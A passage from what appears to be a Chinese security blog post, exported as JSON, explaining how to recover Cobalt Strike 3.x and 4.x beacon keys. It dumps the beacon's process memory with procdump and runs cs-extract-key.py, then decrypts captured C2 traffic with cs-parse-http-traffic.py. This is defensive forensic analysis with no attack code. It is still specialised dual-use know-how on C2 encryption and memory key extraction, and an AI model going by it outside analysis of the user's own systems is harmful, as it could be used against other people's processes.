&gt;<br>\n6703），以便该工具可以忽略所有非 C2 流量的 HTTP 流量。</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vnhj88afAtiDw4z0.png!thumbnail\" alt=\"\"></p>\n<p>再次进行一个总结，同一个心跳包的回包可以带回多条指令，而被同一个回包带回的命令如有多个执行的回显，那也会在同一个包 POST 发送回去。如一次心跳有多个命令执行的回显，方法一的脚本只能解密每次心跳第一次命令执行的回显，方法二解密的通信流量更全</p>\n<h3 id=\"方法三\"><a class=\"markdownIt-Anchor\" href=\"#方法三\">#</a> 方法三：</h3>\n<p>利用动态信标的进程转储直接获得 AES key、HMAC key 以及 RAW<br>\nkey，不需要去破解私钥解密元数组了，当然这个条件肯定需求更多，接下进行说明</p>\n<h4 id=\"3x\"><a class=\"markdownIt-Anchor\" href=\"#3x\">#</a> 3.x</h4>\n<p>首先说明</p>\n<p>为什么能在动态信标的内存转储中直接提取出三个 key，这是适用于 CS3.x 版本的方法，当对动态信标进行内存转储后，文件中能找到未加密的元数组，并且是以 0x0000BEEF<br>\n 开头的字节序列。同时在进程的生命周期中越早获取进程转储，它就越有可能包含未加密的元数据。</p>\n<p>这里先将提取脚本放出来，就不继续看 3.x 了，用的比较少</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进程转储</span><br><span class=\"line\">&gt;tasklist</span><br><span class=\"line\">&gt;procdump.exe -mp PID</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0RpZGllclN0ZXZlbnMvQmV0YS9ibG9iL21hc3Rlci9jcy1leHRyYWN0LWtleS5weQ==\">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</span><br>\n 利用脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-extract-key.py 转储文件.dmp</span><br></pre></td></tr></table></figure>\n<p>可以获得 key</p>\n<h4 id=\"4x\"><a class=\"markdownIt-Anchor\" href=\"#4x\">#</a> 4.x</h4>\n<p>接下来具体讲解和演示一下 4.x。4.x 和 3.x 的区别就在于：4.x 基本不能从动态信标的进程转储文件中恢复未加密的元数组，也就是说直接对 4.x 版本 cs 的动态信标的进程转储文件是提取不出通信所需要的 key。4.x 有自己解密的方法：</p>\n<blockquote>\n<p>AES 和 HMAC<br>\n 密钥可以在可写进程内存中找到，但没有明确标识这些密钥的标头。它们只是<br>\n 16<br>\n 字节长的序列，没有任何可区分的特征。为了提取这些密钥，该方法包括执行一种字典攻击。在进程内存中找到的所有可能的<br>\n 16 字节长、非空序列将用于尝试解密一段加密的 C2<br>\n 通信。如果解密成功，则已找到有效密钥。<br>\n该解密方法除了需要动态信标的进程转储文件之外还需要加密数据</p>\n</blockquote>\n<p>首先先用上文提到的 cs-parse-http-traffic.py 脚本对抓取的流量包进行提取加密数据的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-parse-http-traffic.py -k unknown 1015.pcapng</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZAwTPyXvUc1TN9b3.png!thumbnail\" alt=\"\"></p>\n<p>得到加密数据之后，再用动态信标的进程转储文件进行爆破解密，得到 key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./cs-extract-key.py -t 加密data 转储文件.dmp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XCqoclNSFMhUwNjb.png!thumbnail\" alt=\"\"></p>\n<p>接下来就可以利用 RAWkey 使用 cs-parse-http-traffic.py 对通信流量进行解密了，不同的是这里使用的是 SHA256<br>\nRaw Key，参数为 - k</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./cs-parse-http-traffic.py -k [SHA256 Raw key] 1.pcapng</span><br></pre></td></tr></table></figure>\n<p>接下来总结一下方法三，该方法简单来说就是需要利用动态信标的进程内存转储文件，从里面提取出未加密的元数组。3.x 在进程的生命周期越早时越能直接转储到未加密的元数组并直接进行提取。而 4.x 不行，它无法检测到标识开头，但是不影响转储文件中拥有 key，因此，通过截取所有可能的<br>\n 16 字节长、非空序列去尝试解密加密 data，如果成功，则匹配到正确密钥</p>\n",
            "tags": [
                "流量"
            ]
        }
    ]
}